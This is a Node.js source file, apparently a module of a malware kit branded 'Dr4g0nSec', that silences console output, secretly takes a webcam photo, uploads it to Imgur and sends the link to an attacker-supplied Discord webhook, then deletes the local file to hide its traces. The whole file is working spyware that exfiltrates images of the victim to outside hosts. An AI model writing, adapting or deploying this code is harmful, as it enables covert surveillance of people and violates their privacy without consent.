console.log = console.error = console.warn = console.info = () => {};
const fs = require('fs');
const NodeWebcam = require('node-webcam');
const axios = require('axios');
const FormData = require('form-data');

const H00K3_URL = '%WEBHOOK%';

const webcamOptions = {
  width: 640,
  height: 480,
  quality: 100,
  output: "jpeg",
  callbackReturn: "location",
  device: false,
  verbose: false
};

function getTimestamp() {
  return new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });
}

function sendEmbed(title, description, color, imageUrl = null) {
  const payload = {
    content: "",
    embeds: [
      {
        title,
        description,
        color,
        image: imageUrl ? { url: imageUrl } : undefined,
        footer: {
          text: "Created by: sk4rty | Dr4g0nSec on Top!",
          icon_url: "https://avatars.githubusercontent.com/u/150484081?s=400&u=11e73b9dcb21c916c430fd7a540e6d54bd3a1657&v=4"
        }
      }
    ],
    avatar_url: "https://i.imgur.com/83uCFZe.jpeg",
    username: "Dr4g0nSec | Webcam"
  };

  return axios.post(H00K3_URL, payload).catch(() => {});
}

(async () => {
  try {
    NodeWebcam.capture("webcam_capture", webcamOptions, async (err, imagePath) => {
      if (err || !fs.existsSync(imagePath)) {
        await sendEmbed(
          "Dr4g0nSec | Webcam",
          "❌ Nenhuma webcam foi encontrada ou erro na captura.",
          0xFF0000
        );
        return;
      }

      try {
        const imageData = fs.readFileSync(imagePath);
        const form = new FormData();
        form.append('image', imageData.toString('base64'));

        const imgurRes = await axios.post('https://api.imgur.com/3/image', form, {
          headers: {
            Authorization: 'Client-ID 546088b90160f97',
            ...form.getHeaders()
          }
        });

        const imageUrl = imgurRes.data.data.link;

        await sendEmbed(
          "Dr4g0nSec | Webcam",
          `**<:camera:1366854753589661696> Captura da Webcam! | (${getTimestamp()})**`,
          0x250e80,
          imageUrl
        );

        fs.unlinkSync(imagePath);
      } catch {
        await sendEmbed(
          "Dr4g0nSec | Webcam",
          "❌ Erro ao enviar imagem para o Imgur ou montar o embed.",
          0xFF0000
        );
      }
    });
  } catch {
    await sendEmbed(
      "Dr4g0nSec | Webcam",
      "❌ Erro inesperado durante execução do script.",
      0xFF0000
    );
  }
})();
